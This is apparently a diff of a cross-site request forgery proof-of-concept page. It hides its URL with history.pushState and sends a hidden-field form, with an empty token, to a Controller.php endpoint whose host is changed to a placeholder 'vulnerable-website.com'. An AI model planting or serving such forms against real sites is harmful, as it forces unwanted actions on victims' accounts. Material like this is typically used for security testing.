@@ -1,7 +1,7 @@
 <html>
   <body>
   <script>history.pushState('', '', '/')</script>
-    <form action="https://github.com/sh377c0d3/Controller.php" method="POST">
+    <form action="https://vulnerable-website.com/sh377c0d3/Controller.php" method="POST">
       <input type="hidden" name="hdnToken" value="" />
       <input type="hidden" name="hdnMode" value="1" />
       <input type="hidden" name="hdnSubmit" value="1" />
